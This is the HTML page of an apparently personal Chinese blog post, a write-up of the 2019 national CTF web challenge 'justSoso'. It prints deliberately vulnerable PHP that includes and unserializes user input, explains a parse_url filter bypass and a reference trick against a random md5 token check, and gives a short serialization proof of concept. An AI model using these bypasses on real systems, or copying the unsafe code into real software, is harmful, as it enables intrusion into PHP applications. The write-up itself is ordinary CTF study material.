@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>2019国赛CTF | 42&#39;s Blog | Do not go gentle into that good night. Old age should burn and rave at close of the day.</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="代码审计,PHP,md5绕过,parse_url绕过">
+    <meta name="description" content="WEB-1 justSoso 123456789101112131415161718192021222324252627281	&amp;lt;?php2	error_reporting(0);3	$file = $_GET[&amp;quot;file&amp;quot;];4	$payload = $_GET[&amp;quot;payload&amp;quot;];5	  6	if (!isset($file)) &amp;#123;7">
+<meta name="keywords" content="代码审计,PHP,md5绕过,parse_url绕过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019国赛CTF">
+<meta property="og:url" content="http://yoursite.com/2019/06/06/2019guosai/index.html">
+<meta property="og:site_name" content="42&#39;s Blog">
+<meta property="og:description" content="WEB-1 justSoso 123456789101112131415161718192021222324252627281	&amp;lt;?php2	error_reporting(0);3	$file = $_GET[&amp;quot;file&amp;quot;];4	$payload = $_GET[&amp;quot;payload&amp;quot;];5	  6	if (!isset($file)) &amp;#123;7">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://wx2.sinaimg.cn/mw690/007b2muugy1g3rk245ri0j30hn00rmx9.jpg">
+<meta property="og:updated_time" content="2019-06-06T09:20:40.730Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019国赛CTF">
+<meta name="twitter:description" content="WEB-1 justSoso 123456789101112131415161718192021222324252627281	&amp;lt;?php2	error_reporting(0);3	$file = $_GET[&amp;quot;file&amp;quot;];4	$payload = $_GET[&amp;quot;payload&amp;quot;];5	  6	if (!isset($file)) &amp;#123;7">
+<meta name="twitter:image" content="http://wx2.sinaimg.cn/mw690/007b2muugy1g3rk245ri0j30hn00rmx9.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="42&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">42</h5>
+          <a href="mailto:1678931512@qq.com" title="1678931512@qq.com" class="mail">1678931512@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/">
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives">
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags">
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories">
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/F0urty-Tw0" target="_blank">
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://www.weibo.com/" target="_blank">
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about">
+                <i class="icon icon-lg icon-link"></i>
+                关于我
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">2019国赛CTF</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">2019国赛CTF</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-06-06T09:12:23.164Z" itemprop="datePublished" class="page-time">
+  2019-06-06
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/CTF/">CTF</a><ul class="article-category-list-child"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/CTF/PHP反序列化/">PHP反序列化</a></li></ul></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+
+<article id="post-2019guosai" class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">2019国赛CTF</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-06-06 17:12:23" datetime="2019-06-06T09:12:23.164Z" itemprop="datePublished">2019-06-06</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/CTF/">CTF</a><ul class="article-category-list-child"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/CTF/PHP反序列化/">PHP反序列化</a></li></ul></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style="display:none">
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p><strong>WEB-1 justSoso</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1	&lt;?php</span><br><span class="line">2	error_reporting(0);</span><br><span class="line">3	$file = $_GET[&quot;file&quot;];</span><br><span class="line">4	$payload = $_GET[&quot;payload&quot;];</span><br><span class="line">5	  </span><br><span class="line">6	if (!isset($file)) &#123;</span><br><span class="line">7	    echo &apos;Missing parameter&apos; . &apos;&lt;br&gt;&apos;;</span><br><span class="line">8	&#125;</span><br><span class="line">9	  </span><br><span class="line">10	if (preg_match(&quot;/flag/&quot;, $file)) &#123;</span><br><span class="line">11	    die(&apos;hack attacked!!!&apos;);</span><br><span class="line">12	&#125;</span><br><span class="line">13	  </span><br><span class="line">14	@include ($file);</span><br><span class="line">15	if (isset($payload)) &#123;</span><br><span class="line">16	    $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);</span><br><span class="line">17	    parse_str($url[&apos;query&apos;], $query);</span><br><span class="line">18	    foreach ($query as $value) &#123;</span><br><span class="line">19	        if (preg_match(&quot;/flag/&quot;, $value)) &#123;</span><br><span class="line">20	            die(&apos;stop hacking!&apos;);</span><br><span class="line">21	            exit();</span><br><span class="line">22	        &#125;</span><br><span class="line">23	    &#125;</span><br><span class="line">24	    $payload = unserialize($payload);</span><br><span class="line">25	&#125; else &#123;</span><br><span class="line">26	    echo &quot;Missing parameters&quot;;</span><br><span class="line">27	&#125;</span><br><span class="line">28	?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><em>index.php</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Handle &#123;</span><br><span class="line">    private $handle;</span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        foreach (get_object_vars($this) as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;$k = null;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;Waking upn&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct($handle) &#123;</span><br><span class="line">        $this-&gt;handle = $handle;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $this-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">class Flag &#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $token;</span><br><span class="line">    public $token_flag;</span><br><span class="line">    function __construct($file) &#123;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">        $this-&gt;token_flag = $this-&gt;token = md5(rand(1, 10000));</span><br><span class="line">    &#125;</span><br><span class="line">    public function getFlag() &#123;</span><br><span class="line">        $this-&gt;token_flag = md5(rand(1, 10000));</span><br><span class="line">        if ($this-&gt;token === $this-&gt;token_flag) &#123;</span><br><span class="line">            if (isset($this-&gt;file)) &#123;</span><br><span class="line">                echo @highlight_file($this-&gt;file, true);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">a</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><em>hint.php</em></p>
+<hr>
+<p>这道题的重点不是其中的反序列化，而是其中<code>parse_url</code>与<code>md5</code>的绕过方法</p>
+<hr>
+<p>分析hint源码发现，我们需要将<code>Handle类</code>中的<code>handle属性</code>赋值为<code>Flag类</code>以调用<code>getFlag()</code>函数，<br>但单单这样构造序列化之后，传入的payload中肯定含有“flag”这一字符串，会因index.php源码中的遍历url而被匹配到，经过搜索发现，可以通过加两个双斜杠的方式绕过<code>parse_url</code>进而绕过正则匹配。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://wx2.sinaimg.cn/mw690/007b2muugy1g3rk245ri0j30hn00rmx9.jpg" alt="parse_url绕过" title>
+                </div>
+                <div class="image-caption">parse_url绕过</div>
+            </figure>
+
+
+
+<hr>
+<p>但<code>getFlag()</code>函数中还存在一个问题，虽然<code>Flag类</code>中前几条语句将<code>token属性</code>与<code>token_flag属性</code>相等，getFlag函数中，又将token_flag赋为了一个新的md5加密后的随机值，所以此处又需要绕过，爆破似乎可行，但经过搜索发现存在另一种较为简单的方法：<br>利用取地址符号“<code>&amp;</code>”，来使token与token_flag的关系始终相等，这样在给token_flag赋新值时，token也会跟着变化。</p>
+<p><strong><em>POC:</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1	$b = new Flag(&quot;flag.php&quot;);</span><br><span class="line">2	$b-&gt;token = &amp;$b-&gt;token_flag;</span><br><span class="line">3	$a = new Handle($b);</span><br><span class="line">4	echo serialize($a);</span><br></pre></td></tr></table></figure>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-06-06T09:20:40.730Z" itemprop="dateUpdated">2019-06-06 17:20:40</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="http://yoursite.com">
+            <img src="/img/avatar.jpg" alt="42">
+            42
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/md5绕过/">md5绕过</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/parse-url绕过/">parse_url绕过</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/06/06/2019guosai/&title=《2019国赛CTF》 — 42's Blog&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/06/06/2019guosai/&title=《2019国赛CTF》 — 42's Blog&source=aaaa" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/06/06/2019guosai/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《2019国赛CTF》 — 42's Blog&url=http://yoursite.com/2019/06/06/2019guosai/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2019/06/06/2019guosai/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/06/06/tags_test/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">团队省赛选拔题</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check" data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style="display:none">
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style="display:none">
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>42 &copy; 2015 - 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/06/06/2019guosai/&title=《2019国赛CTF》 — 42's Blog&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/06/06/2019guosai/&title=《2019国赛CTF》 — 42's Blog&source=aaaa" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/06/06/2019guosai/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《2019国赛CTF》 — 42's Blog&url=http://yoursite.com/2019/06/06/2019guosai/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2019/06/06/2019guosai/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://yoursite.com/2019/06/06/2019guosai/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '额';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)你回来啦!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
